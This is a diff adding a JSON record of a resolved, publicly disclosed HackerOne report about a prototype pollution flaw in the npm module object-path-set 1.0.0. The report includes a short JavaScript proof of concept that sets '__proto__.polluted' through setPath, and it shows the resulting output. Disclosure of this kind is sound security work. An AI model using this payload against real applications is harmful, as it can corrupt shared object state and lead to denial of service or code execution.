@@ -1,0 +1,119 @@
+{
+  "id": 878332,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzgzMzI=",
+  "url": "https://hackerone.com/reports/878332",
+  "title": "[object-path-set] Prototype pollution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-05-19T19:17:47.109Z",
+  "submitted_at": "2020-05-19T19:17:47.109Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-20T09:08:31.858Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-20T09:08:31.799Z",
+  "team_member_agreed_on_going_public_at": "2020-08-02T16:49:43.857Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `prototype pollution` vulnerability in `object-path-set` module.\nIt allows an attacker to inject properties on Object.prototype.\n\n# Module\n\n**module name:** `object-path-set`\n**version:** `1.0.0`\n**npm page:** `https://www.npmjs.com/package/object-path-set`\n\n## Module Description\n\nset values in javascript objects by specifying a path.\nif the path doesn't exist yet, it will be created.\n\n## Module Stats\n\n[81] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\n\n## Steps To Reproduce:\n- install `object-path-set` module:\n    - `npm i object-path-set`\n\nSet the `__proto__.polluted` property of an object:\n```javascript\n\nconst setPath = require('object-path-set');\nconst obj = {};\nconsole.log(\"Before : \" + obj.polluted);\nsetPath({}, '__proto__.polluted', 'yes');\nconsole.log(\"After : \" + obj.polluted);\n```\nOutput:\n```console\n\nBefore : undefined\nAfter : yes\n```\n{F835049}\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.",
+  "weakness": {
+    "id": 106,
+    "name": "Modification of Assumed-Immutable Data (MAID)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 835049,
+      "file_name": "object-path-set_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvPBzKtoLWRJdL88xX5oNam2?response-content-disposition=attachment%3B%20filename%3D%22object-path-set_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27object-path-set_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6BUINIA7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T092205Z&X-Amz-Expires=3261&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2BZthqetx2sYvk5flV%2B4ullL1qpu8SCbabmro3z3bbywIgWYlIMV%2B6FUb%2BTGJm%2BEaotptUep9S9656WlFEiRyVllsquwUI%2Ff%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHwalTtqDeQ1l%2BPo6CqPBTS9MjwAKuzBO10OiRfpOYYqAQaxkNfbAJvTFd5KU6p6WzRIpqT4hzlI8VhpQkBEdFgwVavKkSXQzD%2BO%2FUloaT42YaflOEh0JOfpGfPFRpLqz%2Fr2MghJonM1vsrmP37dJSj6Tc8E3eVLGjqZK3kEtP5GtWr5yhobRq9Y9Cy2bwekNvMW2xxEQyyogAsQHZrHOeDLCqKygH1Xv%2BmXsPA1vo1%2FPjXS0fGE7%2F9zo5%2BO%2BAd4laRphBm6n9IWZ%2B6FvwbH2xQIZnNVGj3UR0NxmdYTdTysXGxto0t4grhXKgoQdZDy8k1uSo6nY5myfi%2BIsay32sXvLW0rbaMj9HOc2KtmTuslZJssVxyBQISIVJNni1L9F6BxnpqNIZcsFyUbuJDMh6%2F%2BQrWLGrcUXuU3rjLFFTv5gb0GcQpVP5pmlgmqbVwc4An4TcWEj8eTGgEhVyYLU%2FxHCSKLS06efmL3Tmmqmc0zzuKgC95aCV6fjI4nYeDbqGgxlV3QAPUQjZ%2F7TQa9%2BSNwd8jTo5q%2ByKuq%2BdcKwGWF4mhEoEnQ4ZpvMIyyih8fuAIU8La8ka2J6Ltp%2BpQIdj3QTafU0lHkff%2B7SKuNe3Pwj30bDnAZmgWT%2BADOBY%2FMI4aubXCKI25zs6p%2Bqp4Tu4vF7pv8w5u5d0i1sT%2BdFMv1pEpw42ERGmc3h4ascBBUAPbZnHyuRn8eDr1W0cI%2B%2FnxN7ltBP9geKer2S91N%2BDqNd0xdHpE0vwsOEWXbgVlkJ9SLRDCG7ZBPz%2FAqmqUVQxjShqwpSrNX28kkLE6Czn68I5Qd2kllilkdlzsNeqaySc%2BK8fU0eChYoyOluM5w1u0nAe3RxIjge9%2FOQjMtaAV7ca%2B8KMu%2FULoiFuTE8fswweu9xgY6sQEpW17fj7I6F10aYrpSEScqbNmCrBF52CxvX4uUHutdUoZqooJOL8Hl71qx%2BDWXPAnER%2B%2B3WqM1yGAOkQB8gZoiGU9No9wDRLLXEqv70ndooW6egLwu%2FvGVTnAsnXQu7qdUYPv80VSVjn4jp2A3IuXR%2FbhwrxEObgTrAisxB9dYZdrIkDl1gaQXI19KHI%2FD0OQzBCV%2F%2FAT8ltvXojLO0BqiBpT%2Fv1ZMKD1Jmo0IlbyrHK0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d2868dc796cbe357ebaacc67b1f84cc1191a576632d37f08439bee6728536af0",
+      "file_size": 355266,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-01T16:49:43.966Z",
+  "allow_singular_disclosure_after": -159467541.9253191,
+  "singular_disclosure_allowed": true,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
